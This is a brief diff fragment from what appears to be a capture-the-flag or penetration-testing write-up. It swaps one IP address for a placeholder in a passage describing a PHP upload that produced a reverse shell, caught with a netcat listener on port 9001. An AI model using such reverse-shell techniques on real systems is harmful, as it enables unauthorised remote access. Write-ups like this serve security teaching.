@@ -139,7 +139,7 @@ The file was successfully uploaded and my PHP code was executed sending me the r
 ```
 nc -lvnp 9001             
 listening on [any] 9001 ...
-connect to [192.168.130.206] from (UNKNOWN) [10.82.136.225] 41826
+connect to [TARGET-IP] from (UNKNOWN) [10.82.136.225] 41826
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
